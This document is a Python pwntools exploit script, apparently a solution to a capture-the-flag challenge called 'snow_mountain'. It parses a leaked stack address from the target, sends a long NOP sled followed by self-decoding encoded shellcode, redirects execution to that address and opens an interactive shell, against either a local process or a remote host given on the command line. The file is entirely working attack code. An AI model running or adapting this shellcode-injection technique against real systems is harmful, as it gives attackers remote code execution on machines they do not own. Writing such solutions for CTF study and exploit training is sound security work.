#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './snow_mountain'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
shellcode = '\xeb\x18\x5e\x48\x8d\x7e\x01\xc4\xe2\x7d\x78\x0e\xc5\xfe\x6f\x07\xc5\xfd\xef\xc1\xc5\xfe\x7f\x07\xeb\x06\xe8\xe3\xff\xff\xff\xaa\xe2\x9b\x6a\xfa\xe2\x23\x48\xe2\x14\x85\xc8\xc3\xc4\x85\x85\xd9\xc2\xfc\xe2\x23\x4d\xfa\xfd\xe2\x23\x4c\x1a\x91\xa5\xaf'

# gadget
prdi = 0x00000000004009b3 # pop rdi ; ret

# elf, libc

ru('Current position: ')
addr = eval(rc(14))
info_addr('addr',addr)

ru('> ')
payload = '\x90'*1337*2
payload += shellcode
sl(payload)

ru('> ')
# debug()
sl(hex(addr))

# debug()
# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()

